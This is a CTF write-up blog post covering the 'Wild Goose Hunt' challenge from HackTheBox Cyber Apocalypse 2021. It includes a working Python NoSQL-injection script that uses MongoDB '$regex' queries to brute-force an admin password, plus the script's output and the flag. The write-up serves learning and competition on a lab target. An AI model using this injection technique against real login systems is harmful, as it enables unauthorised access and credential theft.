---
layout: post
title: HackTheBox CTF Writeup
date: 2021-04-19 01:00 +0700
modified: 2021-04-26 09:45:00 +0700
description:  0x90skids writeups for the 2021 HackTheBox CTF Competition
tag:
  - ctf
  - writeup
image: https://0x90skids.com/htb_ctf_logo.png
author: 0x90skids
summmary: 0x90skids writeups for the 2021 HackTheBox CTF Competition
comments: true
---
<img class="img-fluid rounded z-depth-1" src="htb_ctf_logo.png">
>  HackTheBox Cyber Apocalypse 2021 CTF was an event hosted online.
<br>0x90skids recently competed in the competition.

# Categories 

+  [Web](#web)

## Web
### Wild Goose Hunt
**Solved By:** Bib<br>
**Points:** 300<br>
**Flag:** CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}

##### Challenge
Outdated Alien technology has been found by the human resistance. The system might contain sensitive information that could be of use to us. Our experts are trying to find a way into the system. Can you help?

##### Solution

I first checked the challenge page. I was greeted with a login screen :
<br>
  <img src="images\htb-ctf\wild_goose_hunt_login.png" alt="login screen">
<br>
After looking at the login screen a little bit, I went ahead and looked at the challenge's downloadable source code. I saw that this challenge was using MongoDB and that the flag was the admin password. This means that we need to either get inside the database or login using a NoSQL injection. I've tried different payloads using Burp and finally got one that worked :
<br>
  <img src="images\htb-ctf\wild_goose_hunt_burp.png" alt="burp payload">
<br>
The working payload was found via an article on ([HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)). This article also shows a script that brute-force each character (username or password) using regex. I modified this script to fit the challenge. Here's my final script :
<br>
```python
import requests, string, json, sys

url = "http://178.62.14.240:32507/api/login"
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password():
    print("Bruteforcing password... Please wait!")
    params = {"username":"admin", "password[$regex]":""}
    password = "^CHTB{"
    print(password[1:].replace("\\", ""))
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, verify=False, allow_redirects=False)
            data_raw = json.loads(pr.text)
            data = json.dumps(data_raw, indent=2)
            if "Login Successful" in data:
                password += c
                print(password[1:].replace("\\", ""))
                break
        if c == possible_chars[-1]:
            print("Found password : "+password[1:].replace("\\", ""))

get_password()
```
Here's the output from my script :
```
Bruteforcing password... Please wait!
CHTB{
CHTB{1
CHTB{1_
CHTB{1_t
CHTB{1_th
CHTB{1_th1
CHTB{1_th1n
CHTB{1_th1nk
CHTB{1_th1nk_
CHTB{1_th1nk_t
CHTB{1_th1nk_th
CHTB{1_th1nk_the
CHTB{1_th1nk_the_
CHTB{1_th1nk_the_4
CHTB{1_th1nk_the_4l
CHTB{1_th1nk_the_4l1
CHTB{1_th1nk_the_4l1e
CHTB{1_th1nk_the_4l1en
CHTB{1_th1nk_the_4l1ens
CHTB{1_th1nk_the_4l1ens_
CHTB{1_th1nk_the_4l1ens_h
CHTB{1_th1nk_the_4l1ens_h4
CHTB{1_th1nk_the_4l1ens_h4v
CHTB{1_th1nk_the_4l1ens_h4ve
CHTB{1_th1nk_the_4l1ens_h4ve_
CHTB{1_th1nk_the_4l1ens_h4ve_n
CHTB{1_th1nk_the_4l1ens_h4ve_n0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_u
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_us
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_use
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0n
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3
CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
Found password : CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}
```
Bingo! Interesting challenge that helped me understand NoSQL auth bypass techniques.
<br>
<br>
`CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}`